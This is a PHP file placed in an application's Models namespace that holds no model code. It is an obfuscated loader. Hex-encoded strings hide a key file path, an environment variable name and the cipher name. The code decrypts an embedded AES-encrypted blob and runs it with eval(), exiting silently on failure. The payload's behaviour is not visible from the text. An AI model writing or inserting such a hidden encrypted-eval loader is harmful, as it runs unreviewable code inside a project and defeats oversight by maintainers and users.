<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('I9g8HVwl6dixd18weLBtwA==');

$c=base64_decode(

'79iJE9Ip3SI4CAtxG2jvrk3dAXlIeMqcJstmSp3PngwMde2lgB1kWLWevXIViRRkvRXKKopWRR7w' .
'6c1F+KB6wSxg9cPy2AQqTHJ7/a9mBw0gq/btFRkgR4jEjK5wJHHZRmC+WCSYjYNTt4F/hWXG4d7y' .
'NqqzYDYb2SvqTyHULt+Yf7npdSiTq0qZW0Kp+IREUHE6nKq2GgD/DCJszSCsBfvfhUTzhjCzph85' .
'FvUt0XRH+81AwpUxFV8pJ+foBsUADCd/UvZqPx8+4vEaVFD7wc6qf5XQR69SmjkIS1eoULK5/He1' .
'yax23JOEfxMeX2hUCNvUihP2GF4cuxsGZsgAGdkkyvEskGtaow8q9AQNEH4tEf5SBE+zYxb8ZjE2' .
'96MKayDrdh+ePaCvVLiDkDaEQIkBGbgVuTx/bifh5etChBazBLu1dZ1XhTHQfQCj9obb4iuoP4k3' .
'fIpff0ICUo68bHbPGxSi4d/oiE3Ect16SI4VttXbT/0v9yL8v6l+LNRetHV0wAOhVWzcna1ZbQ3H' .
'507nDVt6utZd0jo/yeZrV8heHjtMMxhGHlCsFgKq7UXrvaIXwmPHVrhF3YHGTOJmzfJA3rwilZQa' .
'G6Exyn3CyPMa1/jPrmbh7xO5wDho4zWpt/feX/tSYnXBsTWpFXZ+3gGyNTiwyBzneCvWKhdq8nC2' .
'7nSIQXfYQ1Vt/qpK9yJEKKoH1kxDoBd1XJ3rJoCBoZ+1bk5YlhE4M82kEwGDOHF77LDsRZ+BBVfv' .
'y1TL6168VnQNap1+3EvCA+q/vuuj7F9qYl+95Qv+rARTDaTctO6P+ys16f6ic2+bNSsixZqNYc5j' .
'KfYFy0PT4c9vmkRhOi+MCKsWqyQ4fB3ret90dNGd0E2Lko4C2hMviZn6HCbNQFzACcBFrViej6zC' .
'hAiYmw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

